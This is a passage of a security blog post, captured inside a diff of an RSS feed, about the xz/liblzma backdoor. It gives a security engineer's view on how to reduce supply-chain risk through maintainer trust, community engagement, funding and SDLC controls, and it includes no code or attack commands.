+Also, and this is the more important reasons, people more knoledgeble than me on Threat Actors behaviors are already on it.
+I will just link their posts once are ready, so make sure to check the Resource below.</p>
+<p>One thing I can do here is showing the point of view of a Security Engineer on the issue, how I would mitigate the problem and what steps went wrong.</p>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw"></i>Note<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">TL;DR: there isn&rsquo;t an actual solution</div>
+        </div>
+    </div>
+<h3 id="trust-issues" class="headerLink">
+    <a href="#trust-issues" class="header-mark"></a>4.1 Trust issues</h3><p><figure><a class="lightgallery" href="https://imgs.xkcd.com/comics/dependency_2x.png" title="https://imgs.xkcd.com/comics/dependency_2x.png" data-thumbnail="https://imgs.xkcd.com/comics/dependency_2x.png">
+        <img
+            
+            loading="lazy"
+            src="https://imgs.xkcd.com/comics/dependency_2x.png"
+            srcset="https://imgs.xkcd.com/comics/dependency_2x.png, https://imgs.xkcd.com/comics/dependency_2x.png 1.5x, https://imgs.xkcd.com/comics/dependency_2x.png 2x"
+            sizes="auto"
+            alt="https://imgs.xkcd.com/comics/dependency_2x.png">
+    </a></figure></p>
+<p><code>xz</code> is a software mainteined (up until 2022) by 1 single guy. Later another maintainer joined but unfortunately for us, it was the same guy pushing the backdoor to upstream.</p>
+<p>This crashes against the fact that <code>xz</code> is an incredibly popular package available in a lot of distributions and being a dependency of many softwares.</p>
+<p>This was likely seen by the attacker as a gold mine since it was easy to get the role of maintainer of the project and push the malicious code.</p>
+<p>But how can we mitigate this issue?</p>
+<p>Since you are using a thirdy-part source for your supply chain, you have to trust someone at one point or another.
+When talking about supply chain security the reccomendations are always the same: pin the hashes and use signature verification.</p>
+<p>This will work as long as you have scenarios like a  malicious attacker compromising the dependency CICD and pushing a malicious build, account compromissions etc.</p>
+<p>But what can you do if all of a sudden, trusted maintainer goes rogue?
+Unless you want (and are able to) code review every single commit from every single piece of software your OS interact with: pretty much nothing.
+On the other hand, developers and repository owners should really increase controls on their supply chain and include strict metrics to exclude high risk packages.</p>
+<p>One of the biggest gimmicks of Open Source security is people beliving that since the source code is availbale the code magically became safe.</p>
+<p>One critical factor often overlooked is the assumption that having access to the source code automatically translates into a larger pool of eyes scrutinizing it for vulnerabilities.</p>
+<p>The effectiveness of this review process depends on the level of community engagement and the expertise of those inspecting the codem, and usually is not much at all. Many projects receive minimal attention from developers, with only a handful of individuals actively contributing or reviewing code changes. As a result, vulnerabilities may go unnoticed for extended periods, posing significant security risks to users.</p>
+<p>But which factors could contribute on minimizing the risks?</p>
+<h3 id="github-stars" class="headerLink">
+    <a href="#github-stars" class="header-mark"></a>4.2 GitHub Stars</h3><p>Just to be clear from the beginning: No, you can&rsquo;t trust this kind of metrics.</p>
+<p>There is an hidden market of buying and selling GitHub stats like stars, forks etc.
+You can read a nice article here: <a href="https://dagster.io/blog/fake-stars" target="_blank" rel="noopener noreferrer">https://dagster.io/blog/fake-stars</a></p>
+<h3 id="community-engagement" class="headerLink">
+    <a href="#community-engagement" class="header-mark"></a>4.3 Community Engagement</h3><p>Evaluate the size and engagement of the community surrounding the project.</p>
+<p>A large and active community can provide additional eyes for reviewing code, reporting bugs, and addressing security issues promptly. <code>xz/liblzma</code> had litterally 2 maintainers and one was the malicious actor.</p>
+<h3 id="funding-and-support" class="headerLink">
+    <a href="#funding-and-support" class="header-mark"></a>4.4 Funding and Support</h3><p>Consider whether the project receives financial support or sponsorship from reputable organizations. Projects with dedicated funding tend to have more resources available for security audits and ongoing maintenance.
+And also are less likely to be completely abandoned.</p>
+<p>Remember: you want to rely on that dependency for the whole week, not only during the maintainer&rsquo;s freetime, projects with a nice financial support will be likely to be full-time projects and not just hobbies.</p>
+<h3 id="sdlc" class="headerLink">
+    <a href="#sdlc" class="header-mark"></a>4.5 SDLC</h3><p>A good portion of the evaluation should also focus on the SDLC to e ensure security (and quality in general) gates are correcly implemented, approvals on PRs are mandatory and there are healthy practices in place to prevent one single contributor to push malicious code without approval.</p>
+<p>Also take in considerations that we are humans, and we make errors. Passing a code review doesn&rsquo;t mean the code is safe, as I said before: there is no real solution, just ways to decrease the probablity for the bad stuff to happen.</p>
+<h3 id="enterprise-vs-individual" class="headerLink">
+    <a href="#enterprise-vs-individual" class="header-mark"></a>4.6 Enterprise vs Individual</h3><p>This is a controversial topic because there are projects that are maintained by individuals that are well maintained but usually relying on (large) enterprise projects will ensure their SDLC best practices are followed, money are keeping the project alive, and a big company is less likely to go all in and backdoor their project on purpose. Again, this just increase the probablity, don&rsquo;t that for grant ;)</p>
+<h2 id="resources" class="headerLink">
+    <a href="#resources" class="header-mark"></a>5 Resources</h2><ul>
+<li>OSS-Security List: <a href="https://www.openwall.com/lists/oss-security/2024/03/29/4" target="_blank" rel="noopener noreferrer">https://www.openwall.com/lists/oss-security/2024/03/29/4</a></li>
+<li>Comprehensive timeline: <a href="https://boehs.org/node/everything-i-know-about-the-xz-backdoor" target="_blank" rel="noopener noreferrer">https://boehs.org/node/everything-i-know-about-the-xz-backdoor</a></li>
+</ul>
+]]></description></item></channel></rss>
